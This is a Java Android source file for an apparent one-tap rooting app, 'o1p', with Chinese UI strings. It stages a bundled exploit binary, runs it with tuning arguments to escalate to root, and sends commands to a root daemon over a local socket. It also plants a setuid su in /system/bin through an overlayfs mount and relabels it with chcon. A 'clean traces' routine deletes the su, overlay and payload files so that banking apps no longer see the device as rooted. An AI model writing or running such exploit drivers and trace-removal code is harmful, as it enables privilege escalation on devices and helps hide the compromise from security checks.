package o1.st.shell;

import android.app.Activity;
import android.content.Intent;
import android.content.res.AssetManager;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.method.ScrollingMovementMethod;
import android.view.View;
import android.view.WindowInsets;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

/**
 * o1p root client.
 *
 * Two jobs:
 *  1. autoRoot() - stage the bundled exploit to /data/local/tmp, run it, wait
 *     for the root daemon to come up (one-tap privilege escalation).
 *  2. runCmd()   - send commands to @o1p_rootd and show the output.
 *
 * Both need SELinux to be permissive: while enforcing, connecting to the
 * daemon socket is denied for untrusted_app domains, and the exploit cannot
 * write to tracefs either.
 */
public class MainActivity extends Activity {

    private static final String SOCK = "o1p_rootd";
    // older payload builds used this socket name; keep talking to them if present
    private static final String[] SOCK_FALLBACK = { "o1p_rootd", "o3p_rootd" };
    private static final String TMP = "/data/local/tmp";
    private static final String PAYLOAD = TMP + "/o1p_e.bin";
    private static final String ALLOW = TMP + "/o1p_allow";

    private EditText cmdInput;
    private EditText pairCode;
    private Button wifiBtn;
    private TextView output;
    private Button autoBtn;
    private TextView banner;
    private boolean suDeployed;
    private final Handler ui = new Handler(Looper.getMainLooper());
    private static MainActivity sInstance;

    /** Called from PairReceiver so its output shows up in the UI. */
    private void checkRoot(String msg) {
        if (msg == null) {
            return;
        }
        if (msg.contains("ROOTD sock ready") || msg.contains("GRANT o1.st.shell")) {
            onRootOk();
        }
    }

    /** Deploy a setuid su into /system/bin via overlayfs so every app can use it. */
    /** Run /system/bin/su from this app process (seccomp=2) and report the
     *  real euid it achieves — that is what other root apps will see. */
    /** Let the user pick which apps may use su (grant = uid allowlisted). */
    private void showGrantDialog() {
        new Thread(new Runnable() {
            public void run() {
                final android.content.pm.PackageManager pm = getPackageManager();
                final java.util.List<android.content.pm.ApplicationInfo> apps =
                        new java.util.ArrayList<android.content.pm.ApplicationInfo>();
                // Only apps with a launcher icon: those are the ones the user
                // actually runs. Filtering by uid < 10000 is wrong, because
                // plenty of system components use 10000+ uids on Android 10+.
                android.content.Intent main = new android.content.Intent(
                        android.content.Intent.ACTION_MAIN);
                main.addCategory(android.content.Intent.CATEGORY_LAUNCHER);
                java.util.LinkedHashMap<Integer, android.content.pm.ApplicationInfo> uniq =
                        new java.util.LinkedHashMap<Integer, android.content.pm.ApplicationInfo>();
                for (android.content.pm.ResolveInfo ri : pm.queryIntentActivities(main, 0)) {
                    android.content.pm.ApplicationInfo ai = ri.activityInfo.applicationInfo;
                    uniq.put(ai.uid, ai);
                }
                apps.addAll(uniq.values());
                final java.util.List<String> labels = new java.util.ArrayList<String>();
                final java.util.List<Integer> uids = new java.util.ArrayList<Integer>();
                for (android.content.pm.ApplicationInfo ai : apps) {
                    labels.add(ai.loadLabel(pm) + "\n" + ai.packageName);
                    uids.add(ai.uid);
                }
                ui.post(new Runnable() {
                    public void run() {
                        final String[] items = labels.toArray(new String[0]);
                        final boolean[] checked = new boolean[items.length];
                        new android.app.AlertDialog.Builder(MainActivity.this)
                                .setTitle("选择要授予 root 的应用（共 " + items.length + " 个，可滑动）")
                                .setMultiChoiceItems(items, checked,
                                        new android.content.DialogInterface.OnMultiChoiceClickListener() {
                                            public void onClick(android.content.DialogInterface d,
                                                                int which, boolean isChecked) {
                                                checked[which] = isChecked;
                                            }
                                        })
                                .setPositiveButton("授权", new android.content.DialogInterface.OnClickListener() {
                                    public void onClick(android.content.DialogInterface d, int w) {
                                        grantSelected(items, checked, uids);
                                    }
                                })
                                .setNegativeButton("取消", null)
                                .show();
                    }
                });
            }
        }).start();
    }

    private void grantSelected(String[] items, boolean[] checked, java.util.List<Integer> uids) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < items.length; i++) {
            if (checked[i]) {
                String pkg = items[i].substring(items[i].indexOf("\n") + 1);
                sb.append(PAYLOAD).append(" --allow ").append(uids.get(i)).append("; ");
                logPost("授权: " + pkg + " (uid " + uids.get(i) + ")\n");
            }
        }
        if (sb.length() == 0) {
            logPost("没有选择任何应用\n");
            return;
        }
        execRoot(sb.toString());
        logPost("已写入 root 白名单\n");
    }

    /** Remove every on-disk trace so a reboot lands in a clean state. */
    private void cleanupTraces() {
        log("\n=== 清理 root 痕迹 ===\n");
        new Thread(new Runnable() {
            public void run() {
                String script = "umount /system/bin 2>/dev/null; "
                        + "umount -l /system/bin 2>/dev/null; "
                        + "rm -f /system/bin/su /system/bin/suu /system/bin/magisk 2>/dev/null; "
                        + "rm -rf /data/local/ovl 2>/dev/null; "
                        + "rm -f /data/local/tmp/o1p_* /data/local/tmp/o3p* /data/local/tmp/pure* "
                        + "/data/local/tmp/su_bin* /data/local/tmp/su_test /data/local/tmp/asuid 2>/dev/null; "
                        + "echo CLEANED";
                String r = execRoot(script);
                logPost("清理结果: " + r + "\n");
                logPost("现在重启设备：SELinux 会回到 Enforcing，su/rootd/overlay 全部消失，银行 App 可正常进入。\n");
                ui.post(new Runnable() {
                    public void run() {
                        setPill(false);
                        suDeployed = false;
                    }
                });
            }
        }).start();
    }

    private int dp(int v) {
        return (int) (v * getResources().getDisplayMetrics().density);
    }

    /** Update the action-bar pill: green "root已就绪" / grey "root未就绪". */
    private void setPill(boolean ready) {
        if (banner == null) {
            return;
        }
        banner.setVisibility(View.VISIBLE);
        banner.setText(ready ? "root已就绪" : "root未就绪");
        android.graphics.drawable.GradientDrawable bg =
                new android.graphics.drawable.GradientDrawable();
        bg.setCornerRadius(dp(14));
        bg.setColor(ready ? 0xFF2E7D32 : 0xFF666666);
        banner.setBackground(bg);
    }

    private void testSuFromApp() {
        new Thread(new Runnable() {
            public void run() {
                try {
                    Process p = Runtime.getRuntime().exec(
                            new String[]{"/system/bin/su", "-c", "id"});
                    java.io.BufferedReader r = new java.io.BufferedReader(
                            new java.io.InputStreamReader(p.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = r.readLine()) != null) {
                        sb.append(line).append("\n");
                    }
                    int rc = p.waitFor();
                    logPost("SU-SELFTEST rc=" + rc + " out=" + sb.toString().trim() + "\n");
                } catch (Throwable t) {
                    logPost("SU-SELFTEST 异常: " + t + "\n");
                }
            }
        }).start();
    }

    private void deploySu() {
        try {
            java.io.InputStream in = getAssets().open("su_arm64");
            java.io.File f = new java.io.File("/data/local/tmp/o1p_su");
            java.io.FileOutputStream out = new java.io.FileOutputStream(f);
            byte[] buf = new byte[65536];
            int n;
            while ((n = in.read(buf)) > 0) {
                out.write(buf, 0, n);
            }
            out.close();
            in.close();
        } catch (Throwable t) {
            android.util.Log.e("o1p-su", "stage su failed: " + t);
            return;
        }
        String script = "mkdir -p /data/local/ovl/upper /data/local/ovl/work; "
                + "mount -t overlay overlay -o lowerdir=/system/bin,upperdir=/data/local/ovl/upper,"
                + "workdir=/data/local/ovl/work /system/bin 2>/dev/null; "
                + "cp -f /data/local/tmp/o1p_su /system/bin/su 2>/dev/null || true; "
                + "chown root:shell /system/bin/su; chmod 755 /system/bin/su; "
                + "chcon u:object_r:system_file:s0 /system/bin/su 2>/dev/null; "
                + "ln -sf /system/bin/su /system/bin/suu; "
                + "/data/local/tmp/o1p_e.bin --allow " + android.os.Process.myUid() + "; "
                + "ls -l /system/bin/su /system/bin/suu";
        new Thread(new Runnable() {
            public void run() {
                String r = execRoot(script);
                logPost("su 部署: " + r + "\n");
            }
        }).start();
    }

    private void onRootOk() {
        ui.post(new Runnable() {
            public void run() {
                setPill(true);
                Toast.makeText(MainActivity.this,
                        "✅ 完整 root 已就绪", Toast.LENGTH_LONG).show();
                if (!suDeployed) {
                    suDeployed = true;
                    deploySu();
                }
            }
        });
    }

    static void appendLog(final String msg) {
        final MainActivity a = sInstance;
        if (a == null) {
            return;
        }
        a.checkRoot(msg);
        a.ui.post(new Runnable() {
            public void run() {
                a.output.append(msg.endsWith("\n") ? msg : msg + "\n");
            }
        });
    }
    /** Called from the notification RemoteInput receiver. */
    static void onPairCodeFromNotification(final String code) {
        final MainActivity a = sInstance;
        if (a == null) {
            return;
        }
        a.ui.post(new Runnable() {
            public void run() {
                a.doWireless(code);
            }
        });
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        final int pad = (int) (12 * getResources().getDisplayMetrics().density);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(pad, pad, pad, pad);

        // root state pill lives in the action bar (top-right), replacing the
        // old standalone title + full-width banner
        banner = new TextView(this);
        banner.setTextSize(13);
        banner.setTextColor(0xFFFFFFFF);
        banner.setPadding(dp(12), dp(5), dp(12), dp(5));
        banner.setVisibility(View.GONE);
        android.app.ActionBar ab = getActionBar();
        if (ab != null) {
            android.widget.LinearLayout barBox = new android.widget.LinearLayout(this);
            barBox.setOrientation(android.widget.LinearLayout.HORIZONTAL);
            barBox.setGravity(android.view.Gravity.CENTER_VERTICAL | android.view.Gravity.END);
            barBox.addView(banner);
            ab.setCustomView(barBox, new android.app.ActionBar.LayoutParams(
                    android.app.ActionBar.LayoutParams.MATCH_PARENT,
                    android.app.ActionBar.LayoutParams.MATCH_PARENT,
                    android.view.Gravity.END));
            ab.setDisplayShowCustomEnabled(true);
            ab.setDisplayShowTitleEnabled(false);
        } else {
            root.addView(banner);
        }
        setPill(false);

        pairCode = new EditText(this);
        pairCode.setHint("无线调试配对码（6 位数字）");
        pairCode.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
        root.addView(pairCode, new LinearLayout.LayoutParams(-1, -2));

        wifiBtn = new Button(this);
        wifiBtn.setText("配对（无线调试）");
        wifiBtn.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // jump straight to developer settings, then explain the steps
                try {
                    startActivity(new Intent(
                            android.provider.Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS));
                } catch (Throwable ignored) {
                }
                o1.st.shell.Bootstrap.INSTANCE.watchPairing(MainActivity.this,
                        new o1.st.shell.Logger() {
                            public void log(String msg) {
                                logPost(msg + "\n");
                            }
                        });
                PairNotification.show(MainActivity.this);
                new android.app.AlertDialog.Builder(MainActivity.this)
                        .setTitle("配对无线调试")
                        .setMessage("1. 打开「无线调试」\n"
                                + "2. 点「使用配对码配对设备」\n"
                                + "3. 下拉通知栏，在「o1p：输入无线调试配对码」里填 6 位码\n\n"
                                + "只需配对一次，以后直接用「获取 root」。")
                        .setPositiveButton("知道了", null)
                        .show();
            }
        });
        root.addView(wifiBtn);

        Button rerunBtn = new Button(this);
        rerunBtn.setText("获取 root");
        rerunBtn.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                rerunPayload();
            }
        });
        root.addView(rerunBtn);

        autoBtn = new Button(this);
        autoBtn.setText("本地越权（受限）");
        autoBtn.setTextColor(0xFFEEEEEE);
        autoBtn.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                autoRoot();
            }
        });
        root.addView(autoBtn);
        Button grantBtn = new Button(this);
        grantBtn.setText("授权应用");
        grantBtn.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                showGrantDialog();
            }
        });
        root.addView(grantBtn);

        Button cleanBtn = new Button(this);
        cleanBtn.setText("清理痕迹");
        cleanBtn.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                cleanupTraces();
            }
        });
        root.addView(cleanBtn);

        cmdInput = new EditText(this);
        cmdInput.setText("id -u; getenforce");
        cmdInput.setMinLines(1);
        cmdInput.setMaxLines(3);
        root.addView(cmdInput, new LinearLayout.LayoutParams(-1, -2));

        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);

        Button run = new Button(this);
        run.setText("RUN");
        run.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                runCmd(cmdInput.getText().toString());
            }
        });
        row.addView(run, new LinearLayout.LayoutParams(0, -2, 1f));

        Button status = new Button(this);
        status.setText("STATUS");
        status.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                runCmd("id; echo ---; getenforce; echo ---; "
                        + "grep -E '^(Uid|CapEff|Seccomp|NoNewPrivs):' /proc/self/status");
            }
        });
        row.addView(status, new LinearLayout.LayoutParams(0, -2, 1f));

        Button clear = new Button(this);
        clear.setText("CLEAR");
        clear.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                output.setText("");
            }
        });
        row.addView(clear, new LinearLayout.LayoutParams(0, -2, 1f));

        root.addView(row);

        ScrollView scroll = new ScrollView(this);
        output = new TextView(this);
        output.setTextSize(12);
        output.setTextIsSelectable(true);
        output.setMovementMethod(new ScrollingMovementMethod());
        scroll.addView(output);
        root.addView(scroll, new LinearLayout.LayoutParams(-1, 0, 1f));

        try {
            System.loadLibrary("adb");
            android.util.Log.i("o1p-native", "libadb.so loaded OK");
        } catch (Throwable t) {
            android.util.Log.e("o1p-native", "libadb.so load FAILED: " + t, t);
        }
        try {
            Class<?> c = Class.forName("com.android.org.conscrypt.Conscrypt");
            StringBuilder sb = new StringBuilder("all methods:");
            java.util.TreeSet<String> names = new java.util.TreeSet<String>();
            for (java.lang.reflect.Method mm : c.getDeclaredMethods()) {
                names.add(mm.getName());
            }
            for (String n : names) { sb.append(" ").append(n); }
            android.util.Log.i("o1p-conscrypt", sb.toString());
        } catch (Throwable t) {
            android.util.Log.e("o1p-conscrypt", "reflect FAILED: " + t, t);
        }
        sInstance = this;
        setContentView(root);

        // targetSdk 35 forces edge-to-edge on Android 15+: without handling the
        // insets the first rows end up under the status bar / notch.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
            root.setOnApplyWindowInsetsListener(new View.OnApplyWindowInsetsListener() {
                public android.view.WindowInsets onApplyWindowInsets(View v, android.view.WindowInsets insets) {
                    int top, bottom;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        android.graphics.Insets bars =
                                insets.getInsets(android.view.WindowInsets.Type.systemBars());
                        top = bars.top;
                        bottom = bars.bottom;
                    } else {
                        top = insets.getSystemWindowInsetTop();
                        bottom = insets.getSystemWindowInsetBottom();
                    }
                    v.setPadding(pad, pad + top, pad, pad + bottom);
                    return insets;
                }
            });
        }

        log("uid=" + android.os.Process.myUid() + "\n");
        if (daemonAlive()) {
            log("root daemon 已在线，正在确认 root 状态...\n");
            new Thread(new Runnable() {
                public void run() {
                    final String r = execRoot("id -u");
                    final boolean ok = r != null && r.trim().startsWith("0");
                    ui.post(new Runnable() {
                        public void run() {
                            if (ok) {
                                log("root 仍可用（daemon 存活，重启 App 不影响）。\n");
                                testSuFromApp();
                                setPill(true);
                                if (!suDeployed) {
                                    suDeployed = true;
                                    deploySu();
                                }
                            } else {
                                log("daemon 在线但取不到 root，请重新跑载荷。\n");
                                setPill(false);
                            }
                        }
                    });
                }
            }).start();
        } else {
            log("root daemon 未运行。\n"
                    + "要拿【完整 root】：开启无线调试 → 点“使用配对码配对设备” → "
                    + "把 6 位配对码填到上面 → 点“无线调试自举”。\n"
                    + "（AUTO ROOT 是应用域自越权，seccomp 受限，只够做文件/权限类操作）\n");
        }
    }

    private void log(String s) {
        output.append(s);
    }

    private void logPost(final String s) {
        checkRoot(s);
        ui.post(new Runnable() {
            public void run() {
                output.append(s);
            }
        });
    }

    // ---------------------------------------------------------------- daemon

    private LocalSocket connectAny() throws Exception {
        Exception last = null;
        for (String name : SOCK_FALLBACK) {
            LocalSocket s = new LocalSocket();
            try {
                s.connect(new LocalSocketAddress(name, LocalSocketAddress.Namespace.ABSTRACT));
                return s;
            } catch (Exception e) {
                last = e;
                try {
                    s.close();
                } catch (Exception ignored) {
                }
            }
        }
        throw (last != null ? last : new Exception("no root daemon"));
    }

    private boolean daemonAlive() {
        LocalSocket s = null;
        try {
            s = connectAny();
            return true;
        } catch (Exception e) {
            return false;
        } finally {
            if (s != null) {
                try {
                    s.close();
                } catch (Exception ignored) {
                }
            }
        }
    }

    private String execRoot(String command) {
        LocalSocket s = null;
        try {
            s = connectAny();
            OutputStream os = s.getOutputStream();
            os.write((command + "\n").getBytes("UTF-8"));
            os.flush();
            s.shutdownOutput();
            InputStream is = s.getInputStream();
            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            byte[] chunk = new byte[4096];
            int n;
            while ((n = is.read(chunk)) > 0) {
                buf.write(chunk, 0, n);
            }
            return buf.toString("UTF-8");
        } catch (Exception e) {
            return "ERROR: " + e.getMessage() + "\n";
        } finally {
            if (s != null) {
                try {
                    s.close();
                } catch (Exception ignored) {
                }
            }
        }
    }

    // ------------------------------------------------------- auto escalation

    /** Copy the bundled exploit out of assets and make it executable. */
    private boolean stagePayload() {
        File f = new File(PAYLOAD);
        if (f.exists() && f.length() > 10000) {
            // already staged (e.g. pushed over adb); the daemon runs it, so the
            // app itself never needs exec permission on it
            return true;
        }
        AssetManager am = getAssets();
        InputStream in = null;
        FileOutputStream out = null;
        try {
            in = am.open("exploit.bin");
            out = new FileOutputStream(f);
            byte[] buf = new byte[65536];
            int n;
            while ((n = in.read(buf)) > 0) {
                out.write(buf, 0, n);
            }
            out.flush();
            out.getFD().sync();
            f.setReadable(true, false);
            f.setExecutable(true, false);
            return true;
        } catch (Exception e) {
            logPost("释放载荷失败: " + e.getMessage() + "\n");
            return false;
        } finally {
            try { if (in != null) in.close(); } catch (Exception ignored) { }
            try { if (out != null) out.close(); } catch (Exception ignored) { }
        }
    }

    private void autoRoot() {
        autoBtn.setEnabled(false);
        log("\n=== AUTO ROOT ===\n");
        new Thread(new Runnable() {
            public void run() {
                try {
                    if (daemonAlive()) {
                        logPost("daemon 已在运行，无需越权。\n");
                        return;
                    }
                    if (!stagePayload()) {
                        return;
                    }
                    // make it executable; chmod via the shell helper is not
                    // available while unprivileged, so rely on 0755 from
                    // open() being honoured only if umask allows - try both.
                    Process chmod = new ProcessBuilder("/system/bin/chmod", "755", PAYLOAD)
                            .redirectErrorStream(true).start();
                    chmod.waitFor();

                    logPost("执行载荷（每次尝试约 10-20 秒，命中前会重复）...\n");
                    Process p = new ProcessBuilder(PAYLOAD,
                            "10000", "8192", "0", "0", "6", "1", "8000", "200")
                            .redirectErrorStream(true)
                            .start();

                    InputStream is = p.getInputStream();
                    ByteArrayOutputStream buf = new ByteArrayOutputStream();
                    byte[] chunk = new byte[4096];
                    int n;
                    int last = -1;
                    while ((n = is.read(chunk)) > 0) {
                        buf.write(chunk, 0, n);
                        String all = buf.toString("UTF-8");
                        int idx = all.lastIndexOf("VERDICT");
                        if (idx > last) {
                            last = idx;
                            int nl = all.indexOf('\n', idx);
                            if (nl > idx) {
                                logPost(all.substring(idx, nl + 1));
                            }
                        }
                    }
                    p.waitFor();

                    String tail = buf.toString("UTF-8");
                    int cut = Math.max(0, tail.length() - 1200);
                    logPost("\n--- 载荷输出（尾部）---\n" + tail.substring(cut) + "\n");

                    if (daemonAlive()) {
                        logPost("*** 越权成功，daemon 已启动 ***\n" + execRoot("id -u; getenforce"));
                    } else {
                        logPost("未拿到 root。多半是 SELinux 仍为 Enforcing（应用域无法写 tracefs），\n"
                                + "或本轮未命中（可再点一次）。\n");
                    }
                } catch (Exception e) {
                    logPost("AUTO ROOT 异常: " + e + "\n");
                } finally {
                    ui.post(new Runnable() {
                        public void run() {
                            autoBtn.setEnabled(true);
                        }
                    });
                }
            }
        }).start();
    }

    // ------------------------------------------------------------- commands

    /** Wireless-debugging bootstrap: get a shell-domain process without a PC. */
    private void wirelessBootstrap() {
        doWireless(pairCode.getText().toString().trim());
    }

    /** Open the overlay so the code can be typed without leaving the system
     *  wireless-debugging screen (the code dies as soon as we switch away). */
    private void showPairOverlay() {
        if (!PairOverlay.hasPermission(this)) {
            PairOverlay.requestPermission(this);
            logPost("\n需要“显示在其他应用上层”权限。\n"
                    + "请在设置里打开它，然后回到本 App 再点一次“悬浮窗配对”。\n");
            return;
        }
        logPost("\n悬浮窗已打开。\n"
                + "① 切到「开发者选项 → 无线调试 → 使用配对码配对设备」\n"
                + "② 配对码会显示在屏幕上，悬浮窗就在顶部\n"
                + "③ 在悬浮窗里输入 6 位数字，点“配对”\n");
        final PairOverlay ov = new PairOverlay(this);
        ov.show(new PairOverlay.Callback() {
            public void onPair(final String code) {
                doWireless(code);
            }
        });
    }

    private void rerunPayload() {
        log("\n=== 重跑载荷（不再配对）===\n");
        new Thread(new Runnable() {
            public void run() {
                String payload = stagePayload2();
                if (payload == null) {
                    logPost("载荷释放失败\n");
                    return;
                }
                String cmd = "/system/bin/chmod 755 " + payload + "; "
                        + payload + " 10000 14000 300 1 12 1 8000 800 2>&1; "
                        + payload + " --shell \"" + payload + " --grant "
                        + getPackageName() + "\" 2>&1";
                o1.st.shell.Bootstrap.INSTANCE.runOnly(MainActivity.this, cmd,
                        new o1.st.shell.Logger() {
                            public void log(String msg) {
                                logPost(msg.endsWith("\n") ? msg : msg + "\n");
                            }
                        });
            }
        }).start();
    }

    private void doWireless(final String code) {
        if (code == null || code.length() < 6) {
            logPost("配对码需要 6 位数字\n");
            return;
        }
        wifiBtn.setEnabled(false);
        log("\n=== 无线调试自举 ===\n");
        new Thread(new Runnable() {
            public void run() {
                try {
                    // stop a leftover daemon (e.g. restricted app-domain one) so
                    // the shell-domain daemon can bind the socket
                    try { execRoot("__stop"); } catch (Throwable ignored) { }
                    String payload = stagePayload2();
                    if (payload == null) {
                        logPost("载荷释放失败\n");
                        return;
                    }
                    String chmod = "/system/bin/chmod 755 " + payload + "; ";
                    String pkg = getPackageName();
                    // run the exploit, then let the freshly started root daemon
                    // allowlist this app so it can use the socket afterwards
                    String cmd = chmod + payload + " 10000 14000 300 1 12 1 8000 800 2>&1; "
                            + payload + " --shell \"" + payload + " --grant " + pkg + "\" 2>&1";
                    o1.st.shell.Bootstrap.INSTANCE.pairAndRun(MainActivity.this, code, cmd,
                            new o1.st.shell.Logger() {
                                public void log(String msg) {
                                    logPost(msg.endsWith("\n") ? msg : msg + "\n");
                                }
                            });
                } catch (Throwable t) {
                    logPost("自举异常: " + t + "\n");
                } finally {
                    ui.post(new Runnable() {
                        public void run() {
                            wifiBtn.setEnabled(true);
                        }
                    });
                }
            }
        }).start();
    }

    private String stagePayload2() {
        return stagePayload() ? PAYLOAD : null;
    }

    private void runCmd(final String command) {
        if (command == null || command.trim().isEmpty()) {
            return;
        }
        log("\n$ " + command + "\n");
        new Thread(new Runnable() {
            public void run() {
                final String result = execRoot(command);
                ui.post(new Runnable() {
                    public void run() {
                        output.append(result);
                        if (!result.endsWith("\n")) {
                            output.append("\n");
                        }
                    }
                });
            }
        }).start();
    }
}
